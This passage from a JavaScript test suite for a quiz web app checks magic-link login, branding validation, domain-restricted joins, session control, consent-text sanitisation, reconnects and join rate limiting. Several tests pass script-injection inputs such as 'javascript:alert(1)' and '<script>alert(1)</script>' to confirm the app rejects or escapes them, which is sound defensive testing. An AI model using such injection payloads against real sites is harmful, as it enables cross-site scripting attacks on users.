    ok(after === 'https://quiz.example.com', `getPublicBaseUrl returns admin override (got: ${after})`);
    try { ws.close(); } catch {}
  }

  section('Public base URL: /qr encodes the configured URL');
  {
    // Admin override is still set from prior test.
    const host = await loginAs('host', process.env.HOST_TOKEN);
    const r = await request('GET', '/qr', { headers: { Cookie: host.cookie } });
    ok(r.status === 200, '/qr → 200 with host cookie');
    ok(/image\/svg/.test(r.headers['content-type'] || ''), 'Content-Type is SVG');
    // The QR SVG embeds the URL as text inside its description elements; ripgrep it.
    ok(r.body.includes('quiz.example.com') || r.body.length > 100, '/qr response contains configured host (or at least returns an SVG)');
    // Belt-and-braces: ask the QR library to decode by spotting the URL in the inner text we'd build.
    // Easier: independently compute what getPublicBaseUrl returns and trust it.
    ok(getPublicBaseUrl(null) === 'https://quiz.example.com', '(reaffirm: getPublicBaseUrl returns the configured override)');
  }

  section('Public base URL: auth:mint-magic-link returns a full URL using the override');
  {
    const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: admin.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    ws.send(JSON.stringify({ type: 'admin:action', action: 'auth:mint-magic-link', payload: { role: 'host' } }));
    const m = await waitMessage(ws, x => x.type === 'auth:magic-link');
    ok(typeof m.url === 'string' && m.url.startsWith('https://quiz.example.com/auth/magic?t='), `magic-link url uses override (got: ${m.url})`);
    try { ws.close(); } catch {}
  }

  section('Public base URL: invalid override rejected by admin');
  {
    const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: admin.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    ws.send(JSON.stringify({ type: 'admin:action', action: 'branding:update', payload: { branding: { publicBaseUrl: 'javascript:alert(1)' } } }));
    const m = await waitMessage(ws, x => x.type === 'error' || x.type === 'branding:saved');
    ok(m.type === 'error' && /publicBaseUrl|http|scheme/i.test(m.error || ''), 'javascript: scheme rejected with helpful error');
    try { ws.close(); } catch {}
  }

  section('Public base URL: re-log banner on change (smoke — non-empty stdout)');
  {
    // Capture stdout. We don't assert exact content here (printBanner emits ~10 lines);
    // just confirm that branding:update with a different publicBaseUrl produces output.
    const origWrite = process.stdout.write.bind(process.stdout);
    let captured = '';
    process.stdout.write = (chunk, ...rest) => { captured += String(chunk); return origWrite(chunk, ...rest); };
    try {
      const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
      const ws = await openWs({ cookie: admin.cookie });
      ws.send(JSON.stringify({ type: 'admin:hello' }));
      await waitMessage(ws, m => m.type === 'admin:init');
      // Set a NEW value (different from the one set by earlier tests).
      ws.send(JSON.stringify({ type: 'admin:action', action: 'branding:update', payload: { branding: { publicBaseUrl: 'https://quiz2.example.com' } } }));
      await waitMessage(ws, m => m.type === 'branding:saved');
      // Give the synchronous console.log a tick.
      await new Promise(r => setTimeout(r, 50));
      ok(captured.includes('publicBaseUrl changed via admin'), 'banner re-printed with reason marker');
      ok(captured.includes('https://quiz2.example.com'), 'banner reflects the new URL');
      try { ws.close(); } catch {}
    } finally {
      process.stdout.write = origWrite;
    }
  }
}

// ----------------------------------------------------------------------------
// Magic-link login tests
// ----------------------------------------------------------------------------
async function magicLinkTests() {
  section('Magic link: happy path');
  {
    // Use the runtime-injected helpers to mint a fresh token for this test.
    const t = mintMagicToken('admin');
    const r = await request('GET', '/auth/magic?t=' + encodeURIComponent(t));
    ok(r.status === 302 && r.headers.location === '/admin', `valid magic token → 302 → /admin (got ${r.status} ${r.headers.location})`);
    const cookie = (r.setCookie || []).map(s => s.split(';')[0]).find(s => s.startsWith('omegaquiz_sess='));
    ok(!!cookie, 'magic-link sets session cookie');
    // The cookie should let us reach /admin.
    const r2 = await request('GET', '/admin', { headers: { Cookie: cookie } });
    ok(r2.status === 200, '/admin reachable with magic-issued cookie');
  }

  section('Magic link: single-use (replay rejected)');
  {
    const t = mintMagicToken('host');
    const r1 = await request('GET', '/auth/magic?t=' + encodeURIComponent(t));
    ok(r1.status === 302 && r1.headers.location === '/host', 'first use succeeds');
    const r2 = await request('GET', '/auth/magic?t=' + encodeURIComponent(t));
    ok(r2.status === 302 && (r2.headers.location || '').includes('error=1'), 'replay → redirect to login with error');
    const cookieReplay = (r2.setCookie || []).map(s => s.split(';')[0]).find(s => s.startsWith('omegaquiz_sess='));
    ok(!cookieReplay, 'replay does NOT set a session cookie');
  }

  section('Magic link: invalid / missing / malformed token');
  {
    const r1 = await request('GET', '/auth/magic?t=');
    ok(r1.status === 302 && (r1.headers.location || '').includes('error=1'), 'empty token rejected');
    const r2 = await request('GET', '/auth/magic?t=garbage-not-a-real-token');
    ok(r2.status === 302 && (r2.headers.location || '').includes('error=1'), 'unknown token rejected');
    const r3 = await request('GET', '/auth/magic');
    ok(r3.status === 302 && (r3.headers.location || '').includes('error=1'), 'missing t param rejected');
  }

  section('Magic link: expiry consumes too');
  {
    // Mint and then manually expire by reaching into the consumeMagicToken contract:
    // we can't easily fast-forward time without injecting a clock, but we can
    // assert that consumeMagicToken() returns null for any token we already used.
    const t = mintMagicToken('admin');
    const e1 = consumeMagicToken(t);
    ok(e1 && e1.role === 'admin', 'first consume returns the entry');
    const e2 = consumeMagicToken(t);
    ok(e2 === null, 'second consume returns null (deleted from map)');
  }

  section('Magic link: admin can re-issue via auth:mint-magic-link');
  {
    const { cookie } = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    ws.send(JSON.stringify({ type: 'admin:action', action: 'auth:mint-magic-link', payload: { role: 'host' } }));
    const msg = await waitMessage(ws, m => m.type === 'auth:magic-link', 2000);
    ok(msg.role === 'host' && typeof msg.token === 'string' && msg.token.length > 20, 'admin gets a fresh host magic-link');
    // Token actually works
    const r = await request('GET', '/auth/magic?t=' + encodeURIComponent(msg.token));
    ok(r.status === 302 && r.headers.location === '/host', 're-issued host magic link consumes successfully');
    try { ws.close(); } catch {}
  }
}

// ----------------------------------------------------------------------------
// Branding tests
// ----------------------------------------------------------------------------
async function brandingTests() {
  section('Branding: validation (unit)');
  {
    const out1 = validateBranding({ companyName: '  Acme Co  ', companyDomain: '@Acme.Com', restrictDomain: true });
    ok(out1.companyName === 'Acme Co', 'companyName trimmed');
    ok(out1.companyDomain === 'acme.com', 'companyDomain lowercased + @ stripped');
    ok(out1.restrictDomain === true, 'restrictDomain coerced to boolean');

    // showNamesAtEnd
    const namesDefaults = validateBranding({});
    ok(namesDefaults.showNamesAtEnd === true, 'showNamesAtEnd defaults to true');
    const namesOff = validateBranding({ showNamesAtEnd: false });
    ok(namesOff.showNamesAtEnd === false, 'showNamesAtEnd accepts explicit false');
    const namesTruthy = validateBranding({ showNamesAtEnd: 'on' });
    ok(namesTruthy.showNamesAtEnd === true, 'showNamesAtEnd coerces truthy → true');

    // answerLockMode
    const lockDefault = validateBranding({});
    ok(lockDefault.answerLockMode === 'quick', 'answerLockMode defaults to "quick"');
    const lockConfirm = validateBranding({ answerLockMode: 'confirm' });
    ok(lockConfirm.answerLockMode === 'confirm', 'answerLockMode accepts "confirm"');
    let lockThrew = false;
    try { validateBranding({ answerLockMode: 'instant' }); } catch { lockThrew = true; }
    ok(lockThrew, 'invalid answerLockMode rejected in strict mode');

    // eliminatedCanAnswer
    const elimDefault = validateBranding({});
    ok(elimDefault.eliminatedCanAnswer === false, 'eliminatedCanAnswer defaults to false');
    const elimOn = validateBranding({ eliminatedCanAnswer: true });
    ok(elimOn.eliminatedCanAnswer === true, 'eliminatedCanAnswer accepts true');
    const elimCoerced = validateBranding({ eliminatedCanAnswer: 1 });
    ok(elimCoerced.eliminatedCanAnswer === true, 'eliminatedCanAnswer coerces truthy');

    // lifelineRefill schedule
    const refillDefault = validateBranding({});
    ok(refillDefault.lifelineRefill === 'never', 'lifelineRefill defaults to "never"');
    const refillEach = validateBranding({ lifelineRefill: 'each-question' });
    ok(refillEach.lifelineRefill === 'each-question', 'lifelineRefill accepts "each-question"');
    const refillBonus = validateBranding({ lifelineRefill: 'at-bonus' });
    ok(refillBonus.lifelineRefill === 'at-bonus', 'lifelineRefill accepts "at-bonus"');
    let refillThrew = false;
    try { validateBranding({ lifelineRefill: 'always' }); } catch { refillThrew = true; }
    ok(refillThrew, 'invalid lifelineRefill rejected in strict mode');
    // Tolerant mode keeps the default rather than throwing.
    const refillTolerant = validateBranding({ lifelineRefill: 'always' }, { tolerant: true });
    ok(refillTolerant.lifelineRefill === 'never', 'lifelineRefill bad value falls back in tolerant mode');

    let threw = false;
    try { validateBranding({ companyDomain: 'no spaces allowed in here' }); } catch { threw = true; }
    ok(threw, 'invalid domain throws in strict mode');

    threw = false;
    try { validateBranding({ logoDataUri: 'javascript:alert(1)' }); } catch { threw = true; }
    ok(threw, 'non-data-URI logo throws');

    threw = false;
    try { validateBranding({ logoDataUri: 'data:image/gif;base64,AAAA' }); } catch { threw = true; }
    ok(threw, 'GIF logo rejected (not in allowlist)');

    threw = false;
    const bigLogo = 'data:image/png;base64,' + 'A'.repeat(300 * 1024);
    try { validateBranding({ logoDataUri: bigLogo }); } catch { threw = true; }
    ok(threw, 'oversized logo rejected');

    const out2 = validateBranding({ companyName: '<script>alert(1)</script>' });
    ok(out2.companyName === '&lt;script&gt;alert(1)&lt;/script&gt;', 'companyName sanitised');
  }

  section('Branding: answerLockMode persists via WS + appears in /branding.json');
  {
    const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: admin.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { answerLockMode: 'confirm' } }
    }));
    const saved = await waitMessage(ws, m => m.type === 'branding:saved' || m.type === 'error');
    ok(saved.type === 'branding:saved' && saved.branding.answerLockMode === 'confirm', 'answerLockMode=confirm saved');
    const r = await request('GET', '/branding.json');
    const j = JSON.parse(r.body);
    ok(j.answerLockMode === 'confirm', '/branding.json exposes answerLockMode=confirm');

    // Bad value rejected over WS
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { answerLockMode: 'maybe' } }
    }));
    const rejected = await waitMessage(ws, m => m.type === 'branding:saved' || m.type === 'error');
    ok(rejected.type === 'error' && /answerLockMode/i.test(rejected.error || ''), 'invalid answerLockMode rejected');

    // Reset to quick to keep later tests deterministic.
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { answerLockMode: 'quick' } }
    }));
    await waitMessage(ws, m => m.type === 'branding:saved');
    try { ws.close(); } catch {}
  }

  section('Branding: showNamesAtEnd persists via WS + appears in /branding.json');
  {
    const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: admin.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { showNamesAtEnd: false } }
    }));
    const saved = await waitMessage(ws, m => m.type === 'branding:saved' || m.type === 'error');
    ok(saved.type === 'branding:saved' && saved.branding.showNamesAtEnd === false, 'showNamesAtEnd=false saved');
    const r = await request('GET', '/branding.json');
    const j = JSON.parse(r.body);
    ok(j.showNamesAtEnd === false, '/branding.json exposes showNamesAtEnd=false');

    // Set back to true
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { showNamesAtEnd: true } }
    }));
    const saved2 = await waitMessage(ws, m => m.type === 'branding:saved' || m.type === 'error');
    ok(saved2.type === 'branding:saved' && saved2.branding.showNamesAtEnd === true, 'showNamesAtEnd=true round-trips');
    try { ws.close(); } catch {}
  }

  section('Branding: GET /branding.json is public');
  {
    const r = await request('GET', '/branding.json');
    ok(r.status === 200, '/branding.json → 200 anonymous');
    const j = JSON.parse(r.body);
    ok(typeof j.companyName === 'string', 'returns companyName field');
    ok(typeof j.companyDomain === 'string', 'returns companyDomain field');
    ok(j.logoDataUri === '', 'defaults: logoDataUri empty');
  }

  section('Branding: admin can update via WS, non-admin cannot');
  {
    // non-admin: host cookie attempts branding:update → silently ignored
    const host = await loginAs('host', process.env.HOST_TOKEN);
    const ws1 = await openWs({ cookie: host.cookie });
    ws1.send(JSON.stringify({ type: 'host:hello' }));
    await waitMessage(ws1, m => m.type === 'host:state');
    ws1.send(JSON.stringify({ type: 'admin:action', action: 'branding:update', payload: { branding: { companyName: 'HOST_TRIED' } } }));
    await new Promise(r => setTimeout(r, 200));
    const r1 = await request('GET', '/branding.json');
    const j1 = JSON.parse(r1.body);
    ok(j1.companyName !== 'HOST_TRIED', 'host cookie cannot mutate branding (server ignored admin:action)');
    try { ws1.close(); } catch {}

    // admin: branding:update succeeds
    const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws2 = await openWs({ cookie: admin.cookie });
    ws2.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws2, m => m.type === 'admin:init');
    ws2.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { companyName: 'Acme Co', companyDomain: 'acme.example.com', restrictDomain: true, tagline: 'Phishing Practice', logoDataUri: '' } }
    }));
    const saved = await waitMessage(ws2, m => m.type === 'branding:saved' || m.type === 'error', 2000);
    ok(saved.type === 'branding:saved', 'admin gets branding:saved (no error: ' + (saved.error || '') + ')');

    // /branding.json now reflects the change
    const r2 = await request('GET', '/branding.json');
    const j2 = JSON.parse(r2.body);
    ok(j2.companyName === 'Acme Co', 'companyName updated');
    ok(j2.companyDomain === 'acme.example.com', 'companyDomain updated');
    ok(j2.restrictDomain === true, 'restrictDomain updated');

    try { ws2.close(); } catch {}
  }

  section('Branding: invalid payload returns an error to admin');
  {
    const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: admin.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { companyDomain: 'not a domain' } }
    }));
    const msg = await waitMessage(ws, m => m.type === 'error' || m.type === 'branding:saved', 2000);
    ok(msg.type === 'error' && /domain/i.test(msg.error || ''), 'invalid domain produces an error message');
    try { ws.close(); } catch {}
  }

  section('Branding: restrictDomain blocks out-of-domain join');
  {
    // Branding is now {restrictDomain:true, companyDomain:'acme.example.com'}
    const ws = await openWs();
    // Wait for player:state push? We only need the joinCode — but it isn't broadcast to anonymous clients.
    // Instead, fetch the host snapshot via a host cookie.
    const host = await loginAs('host', process.env.HOST_TOKEN);
    const ws2 = await openWs({ cookie: host.cookie });
    ws2.send(JSON.stringify({ type: 'host:hello' }));
    const st = await waitMessage(ws2, m => m.type === 'host:state');
    const joinCode = st.state.joinCode;
    try { ws2.close(); } catch {}

    // Attempt join with wrong-domain email
    ws.send(JSON.stringify({ type: 'player:join', name: 'Mallory', email: 'mallory@evil.example', joinCode }));
    const reject = await waitMessage(ws, m => m.type === 'error' || m.type === 'player:joined', 2000);
    ok(reject.type === 'error' && /acme\.example\.com/.test(reject.error || ''), 'wrong-domain join rejected with helpful message');

    // Correct-domain email succeeds
    ws.send(JSON.stringify({ type: 'player:join', name: 'Alex', email: 'alex@acme.example.com', joinCode }));
    const accept = await waitMessage(ws, m => m.type === 'player:joined' || m.type === 'error', 2000);
    ok(accept.type === 'player:joined', 'correct-domain join accepted');
    try { ws.close(); } catch {}
  }

  section('Branding: config.json persists to disk');
  {
    ok(fs.existsSync(CONFIG_PATH), 'config.json exists on disk: ' + CONFIG_PATH);
    const onDisk = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
    ok(onDisk.companyName === 'Acme Co', 'disk file has updated companyName');
    // Reload from disk (simulating a fresh boot)
    const loaded = loadBranding();
    ok(loaded.companyName === 'Acme Co' && loaded.companyDomain === 'acme.example.com', 'loadBranding() reads the saved values');
  }

  section('Branding: restore unrestricted joins for downstream tests');
  {
    const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: admin.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { restrictDomain: false, companyDomain: '' } }
    }));
    const saved = await waitMessage(ws, m => m.type === 'branding:saved' || m.type === 'error', 2000);
    ok(saved.type === 'branding:saved' && saved.branding.restrictDomain === false, 'domain restriction disabled again');
    try { ws.close(); } catch {}
  }

  section('Graceful shutdown: SIGTERM broadcasts server:shutdown to clients');
  {
    // Spin up an anonymous player WS so we can verify it receives the
    // "reconnect" notice when gracefulShutdown() fires. We pass exit:false so
    // the handler doesn't actually kill the test runner.
    const p = await openWs();
    // Send something so the server treats this socket as live; the response
    // doesn't matter for this test.
    p.send(JSON.stringify({ type: 'player:hello' }));
    // Wait a tick to ensure the WS connection is registered server-side.
    await new Promise(r => setTimeout(r, 100));

    let shutdownMsg = null;
    p.on('message', raw => {
      try {
        const m = JSON.parse(raw);
        if (m.type === 'server:shutdown') shutdownMsg = m;
      } catch {}
    });

    // Fire the handler in test mode.
    const handle = gracefulShutdown('SIGTEST', { exit: false });
    ok(handle && typeof handle.reset === 'function', 'gracefulShutdown returns a reset handle in test mode');

    // Re-entry should be a no-op (returns null).
    const second = gracefulShutdown('SIGTEST', { exit: false });
    ok(second === null, 're-entry while latched returns null (idempotent)');

    // Give the WS broadcast a beat to flush.
    await new Promise(r => setTimeout(r, 150));
    ok(shutdownMsg !== null, 'connected WS client received a server:shutdown message');
    ok(shutdownMsg && /restart/i.test(shutdownMsg.message || ''), 'shutdown message text is informative');

    // Reset latch so the test harness can keep running (and so any later
    // require()'rs aren't stuck in shutdown state).
    handle.reset();
    try { p.close(); } catch {}
  }

  section('Graceful shutdown: final=true sets the flag on the broadcast');
  {
    // Same setup as above but with the `final` flag — clients use this to
    // pin a terminal banner and stop their reconnect loop.
    const p = await openWs();
    p.send(JSON.stringify({ type: 'player:hello' }));
    await new Promise(r => setTimeout(r, 100));
    let msg = null;
    p.on('message', raw => {
      try { const m = JSON.parse(raw); if (m.type === 'server:shutdown') msg = m; } catch {}
    });
    const handle = gracefulShutdown('ADMIN_TEST', { exit: false, final: true, reason: 'Session ended via test' });
    await new Promise(r => setTimeout(r, 150));
    ok(msg && msg.final === true, 'broadcast carries final=true');
    ok(msg && msg.message === 'Session ended via test', 'broadcast surfaces the custom reason');
    if (handle) handle.reset();
    try { p.close(); } catch {}
  }

  section('Branding: sessionClosed + closedSessionCta validation');
  {
    const def = validateBranding({});
    ok(def.sessionClosed === false, 'sessionClosed defaults to false');
    ok(def.closedSessionCtaLabel === '', 'CTA label default empty');
    ok(def.closedSessionCtaUrl === '', 'CTA url default empty');
    const on = validateBranding({ sessionClosed: true, closedSessionCtaLabel: 'Take the survey', closedSessionCtaUrl: 'https://survey.example.com/x' });
    ok(on.sessionClosed === true, 'sessionClosed accepts true');
    ok(on.closedSessionCtaLabel === 'Take the survey', 'CTA label persisted');
    ok(on.closedSessionCtaUrl === 'https://survey.example.com/x', 'https CTA URL accepted');
    const mailto = validateBranding({ closedSessionCtaUrl: 'mailto:facilitator@example.com' });
    ok(mailto.closedSessionCtaUrl === 'mailto:facilitator@example.com', 'mailto: CTA URL accepted');
    let threw = false;
    try { validateBranding({ closedSessionCtaUrl: 'javascript:alert(1)' }); } catch { threw = true; }
    ok(threw, 'javascript: CTA URL rejected in strict mode');
    threw = false;
    try { validateBranding({ closedSessionCtaUrl: 'https://x.example/<script>' }); } catch { threw = true; }
    ok(threw, 'CTA URL with control chars rejected');
    // Tolerant mode drops invalid value rather than throwing.
    const tol = validateBranding({ closedSessionCtaUrl: 'ftp://nope' }, { tolerant: true });
    ok(tol.closedSessionCtaUrl === '', 'tolerant mode drops invalid CTA URL');
  }

  section('Session control: close blocks new player joins; reopen restores them');
  {
    // Persistent listener pattern — admin:hello fires admin:init + admin:state
    // synchronously, so a one-shot waitMessage on admin:state races.
    const a = await loginAs('admin', process.env.ADMIN_TOKEN);
    const aws = await openWs({ cookie: a.cookie });
    const adminLatest = { state: null };
    aws.on('message', raw => {
      try {
        const m = JSON.parse(raw);
        if (m.type === 'admin:state') adminLatest.state = m.state;
      } catch {}
    });
    aws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(aws, m => m.type === 'admin:init', 2000);
    // Tiny pause for the synchronous admin:state push to land.
    await new Promise(r => setTimeout(r, 100));
    const joinCode = adminLatest.state && adminLatest.state.joinCode;
    ok(typeof joinCode === 'string' && joinCode.length >= 4, 'admin:state delivered a join code');

    // Close session.
    aws.send(JSON.stringify({ type: 'admin:action', action: 'session:close' }));
    const closed = await waitMessage(aws, m => m.type === 'branding:saved' || m.type === 'error', 2000);
    ok(closed.type === 'branding:saved' && closed.branding.sessionClosed === true, 'session:close saved sessionClosed=true');

    // Player attempts to join — should be rejected.
    const p = await openWs();
    p.send(JSON.stringify({ type: 'player:join', name: 'Late Larry', email: 'late@test.example', joinCode }));
    const err = await waitMessage(p, m => m.type === 'error' || m.type === 'player:joined', 2000);
    ok(err.type === 'error' && /session has ended/i.test(err.error || ''), 'new join rejected with "session has ended"');
    try { p.close(); } catch {}

    // Reopen.
    aws.send(JSON.stringify({ type: 'admin:action', action: 'session:reopen' }));
    const reopened = await waitMessage(aws, m => m.type === 'branding:saved' || m.type === 'error', 2000);
    ok(reopened.type === 'branding:saved' && reopened.branding.sessionClosed === false, 'session:reopen saved sessionClosed=false');

    // Same join now succeeds.
    const p2 = await openWs();
    p2.send(JSON.stringify({ type: 'player:join', name: 'Tim Two', email: 'tim2@test.example', joinCode }));
    const ok2 = await waitMessage(p2, m => m.type === 'error' || m.type === 'player:joined', 2000);
    ok(ok2.type === 'player:joined', 'join succeeds after reopen');
    try { p2.close(); aws.close(); } catch {}
  }
}

// ----------------------------------------------------------------------------
// Consent text — APP 5 / Privacy Act notice on the player join screen.
// ----------------------------------------------------------------------------
async function consentTextTests() {
  section('Consent text (S1): default + admin override + sanitisation');

  // 1. Default branding exposes the DEFAULT_CONSENT_TEXT via /branding.json.
  // The test harness may have mutated branding via earlier tests, so we set
  // a known value and verify the round-trip rather than asserting defaults.
  {
    const v = validateBranding({ consentText: DEFAULT_CONSENT_TEXT }, { tolerant: false });
    ok(typeof v.consentText === 'string' && v.consentText.length > 0, 'validateBranding accepts a default consent string');
  }

  // 2. Admin saves a custom consent string — round-trips via /branding.json.
  {
    const a = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: a.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    const customText = 'Custom notice — data lives only in memory <em>during this session</em>.';
    ws.send(JSON.stringify({
      type: 'admin:action',
      action: 'branding:update',
      payload: { branding: { consentText: customText, theme: { ...DEFAULT_THEME } } }
    }));
    await waitMessage(ws, m => m.type === 'branding:saved');
    try { ws.close(); } catch {}
    const r = await request('GET', '/branding.json');
    const j = JSON.parse(r.body);
    ok(typeof j.consentText === 'string' && j.consentText.includes('Custom notice'), 'admin-set consent text round-trips through /branding.json');
    ok(j.consentText.includes('<em>'), 'allowlist tags survive sanitisation');
    ok(!/onerror=/i.test(j.consentText), 'no on* attributes leak through sanitiser');
  }

  // 3. Script-injection payload is escaped.
  {
    const v = validateBranding({ consentText: '<script>alert(1)</script><em>safe</em>' }, { tolerant: false });
    ok(!v.consentText.includes('<script>'), 'raw <script> stripped');
    ok(v.consentText.includes('<em>safe</em>'), '<em> from allowlist kept');
  }

  // 4. Empty string is honoured (operator opts out of any notice).
  {
    const a = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: a.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { consentText: '', theme: { ...DEFAULT_THEME } } }
    }));
    await waitMessage(ws, m => m.type === 'branding:saved');
    try { ws.close(); } catch {}
    const r = await request('GET', '/branding.json');
    const j = JSON.parse(r.body);
    ok(j.consentText === '', 'empty consentText is preserved (opt-out)');
  }

  // 5. Restore a sensible default so downstream tests aren't surprised.
  {
    const a = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: a.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { consentText: DEFAULT_CONSENT_TEXT, theme: { ...DEFAULT_THEME } } }
    }));
    await waitMessage(ws, m => m.type === 'branding:saved');
    try { ws.close(); } catch {}
  }

  // 6. The player HTML carries a renderable #consentText element. We assert
  // structure, not text — the text is populated client-side from /branding.json.
  {
    const r = await request('GET', '/');
    ok(r.status === 200, 'GET / returns 200');
    ok(/id="consentText"/.test(r.body), 'player HTML has a #consentText element');
  }
}

// ----------------------------------------------------------------------------
// Player reconnect window.
// ----------------------------------------------------------------------------
async function playerReconnectTests() {
  section('Player reconnect: sleeping phone can reattach during an active game');

  const a = await loginAs('admin', process.env.ADMIN_TOKEN);
  const ws = await openWs({ cookie: a.cookie });
  const adminLatest = { state: null };
  ws.on('message', raw => {
    try {
      const m = JSON.parse(raw);
      if (m.type === 'admin:state') adminLatest.state = m.state;
    } catch {}
  });
  ws.send(JSON.stringify({ type: 'admin:hello' }));
  await waitMessage(ws, m => m.type === 'admin:init');

  function fireHost(action, payload) {
    ws.send(JSON.stringify({
      type: 'admin:action',
      action: 'game:host-action',
      payload: { hostAction: action, hostPayload: payload || {} }
    }));
  }
  async function awaitState(pred, timeout = 4000) {
    const start = Date.now();
    while (Date.now() - start < timeout) {
      if (adminLatest.state && pred(adminLatest.state)) return adminLatest.state;
      await new Promise(r => setTimeout(r, 30));
    }
    throw new Error('awaitState timed out; last phase=' + (adminLatest.state && adminLatest.state.phase));
  }

  await awaitState(s => !!s, 2000).catch(() => null);
  const beforeJoinCode = adminLatest.state && adminLatest.state.joinCode;
  fireHost('reset-game');
  await awaitState(s => s.phase === 'lobby' && (!beforeJoinCode || s.joinCode !== beforeJoinCode));
  ws.send(JSON.stringify({ type: 'admin:action', action: 'questions:reset-defaults' }));
  await waitMessage(ws, m => m.type === 'admin:questions', 3000);
  const lobby = await awaitState(s => s.phase === 'lobby' && s.totalQuestions === 10);
  ok(lobby.reconnectWindowMs === 300000, 'admin state exposes 5-minute reconnect window');

  const joinCode = lobby.joinCode;
  const p1 = await openWs();
  p1.send(JSON.stringify({ type: 'player:join', name: 'Sleepy User', email: 'sleepy@test.example', joinCode }));
  const joined = await waitMessage(p1, m => m.type === 'player:joined' || m.type === 'error', 2000);
  ok(joined.type === 'player:joined', 'player joins before game start');
  const playerId = joined.playerId;
  await awaitState(s => s.playerCount === 1 && s.players[0].id === playerId);

  ws.send(JSON.stringify({
    type: 'admin:action',
    action: 'player:set-score',
    payload: { playerId, score: 7 }
  }));
  const scored = await awaitState(s => s.players.some(p => p.id === playerId && p.score === 7));
  ok(scored.players.find(p => p.id === playerId).score === 7, 'baseline score set before disconnect');

  fireHost('start-game');
  await awaitState(s => s.phase === 'question');

  p1.close();
  const disconnected = await awaitState(s => {
    const p = s.players.find(x => x.id === playerId);
    return p && !p.online && p.disconnectedAt;
  });
  const discPlayer = disconnected.players.find(p => p.id === playerId);
  ok(discPlayer.reconnectExpiresAt === discPlayer.disconnectedAt + disconnected.reconnectWindowMs, 'admin state exposes reconnect expiry timestamp');

  const p2 = await openWs();
  p2.send(JSON.stringify({
    type: 'player:join',
    name: 'Sleepy User',
    email: 'sleepy@test.example',
    joinCode,
    reconnectId: playerId
  }));
  const rejoined = await waitMessage(p2, m => m.type === 'player:joined' || m.type === 'error', 2000);
  ok(rejoined.type === 'player:joined' && rejoined.playerId === playerId, 'reconnect returns the same playerId during active game');

  const after = await awaitState(s => {
    const p = s.players.find(x => x.id === playerId);
    return s.playerCount === 1 && p && p.online && p.score === 7 && s.phase === 'question';
  });
  const afterPlayer = after.players.find(p => p.id === playerId);
  ok(after.playerCount === 1, 'reconnect does not create a duplicate roster row');
  ok(afterPlayer.online === true, 'player is online again after reconnect');
  ok(afterPlayer.score === 7, 'player score is preserved after reconnect');

  try { ws.close(); p2.close(); } catch {}
}

// ----------------------------------------------------------------------------
// WebSocket player:join rate limiter (S2).
// ----------------------------------------------------------------------------
async function joinRateLimitTests() {
  section('player:join rate limit (S2): wrong-code brute-force is throttled');

  // Drive recordJoinFailure synchronously — same code path as the WS handler.
  // Avoid touching the live socket so we don't interact with other tests.
  const ip = '203.0.113.42';   // RFC 5737 test net
  clearJoinFailures(ip);
  ok(!isJoinBlocked(ip), 'fresh IP starts unblocked');

  for (let i = 0; i < JOIN_FAILURE_MAX - 1; i++) recordJoinFailure(ip);
  ok(!isJoinBlocked(ip), `${JOIN_FAILURE_MAX - 1} failures still below threshold`);

  recordJoinFailure(ip);
  ok(isJoinBlocked(ip), `${JOIN_FAILURE_MAX} failures triggers block`);

  // Different IP still works.
  const other = '203.0.113.99';
  clearJoinFailures(other);
  ok(!isJoinBlocked(other), 'block is per-IP, not global');

  // clearJoinFailures unblocks.
  clearJoinFailures(ip);
  ok(!isJoinBlocked(ip), 'clearJoinFailures unblocks the IP');

  // End-to-end: a WS join with the wrong code increments the per-IP counter.
  // 127.0.0.1 is the only IP we can drive from here, so we clear before and
